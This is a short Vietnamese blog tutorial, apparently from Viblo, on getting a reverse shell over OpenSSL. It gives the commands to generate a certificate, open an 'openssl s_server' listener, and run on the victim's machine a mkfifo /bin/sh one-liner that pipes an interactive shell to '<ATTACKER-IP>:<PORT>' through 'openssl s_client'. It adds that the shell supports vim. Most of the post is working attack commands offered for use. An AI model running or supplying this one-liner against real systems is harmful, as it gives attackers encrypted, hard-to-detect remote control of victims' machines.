![](https://images.viblo.asia/7a73d848-95aa-4b3d-ae66-40887ae5fe92.png)

Khi tìm hiểu về shell và cách thức lên shell trên hệ thống mục tiêu mình thấy rất thú vị. Nên đã viết bài này để chia sẻ cái mình đã nghe ngóng và tìm hiểu được.

Chưa biết shell là gì hãy đọc bài [Shell (computing)](https://en.wikipedia.org/wiki/Shell_(computing)) trên Wikipedia.

Trên Google có rất nhiều bài giải thích shell là gì và sử dụng cái gì để có thể lên được shell trên hệ thống của mục tiêu.

![](https://images.viblo.asia/af4c2ff9-eeea-47eb-9a40-302f088380ce.png)

Sau một thời gian tìm hiểu mình rút ra rằng có rất nhiều cách khác nhau được sử dụng để lên shell. Ta có thể sử dụng netcat, python, php, .net, vân vân và mây mây. Và sau đó mình tìm được một cách lên shell khác đó là sử dụng [OpenSSL](https://en.wikipedia.org/wiki/OpenSSL).

# Chuẩn bị
Đầu tiên ta cần tạo ra khóa trên máy tính mà mục tiêu sẽ kết nối tới (trong thực tế đó chính là server của mình).
Chạy câu lệnh dưới để tạo khóa

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

![](https://images.viblo.asia/431f256f-c03f-4954-81be-fa6390ec5ef6.png)

Khi hệ thống yêu cầu mình nhập thì nhấn **Enter** cho đến khi hoàn thành.

# Tạo kết nối lắng nghe
Sau khi đã tạo xong khóa tiếp theo là tạo lắng nghe trên server.
Chạy lệnh dưới để tạo kết nối lắng nghe:

```bash
openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>
```

![](https://images.viblo.asia/e45047fb-35ec-4f79-904a-76dbe7cf34fb.png)

Một cổng đang mở để chờ cho mục tiêu kết nối tới.

# Thực hiện reverse shell
Khi đã mở một lắng nghe, trên máy của nạn nhân ta chạy lệnh để tiến hành reverse shell vể máy của ta.
Chạy lệnh dưới

```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s
```

Trong demo mình sử dụng máy ubuntu để làm máy tính mục tiêu.

![](https://images.viblo.asia/76c8531e-bcf2-43ae-9a78-55274f769ada.png)

Như kết quả trên hình ta đã thực hiện reverse shell thành công.

# Bonus
Khi thực hiện reverse shell thì ta không thể sử dụng vim được. Nhưng với OpenSSL thì ta có thể sự dụng được.

![](https://images.viblo.asia/92a0905d-bd8a-42e0-834b-aa8704f20985.png)

# Tham khảo
https://medium.com/@int0x33/day-43-reverse-shell-with-openssl-1ee2574aa998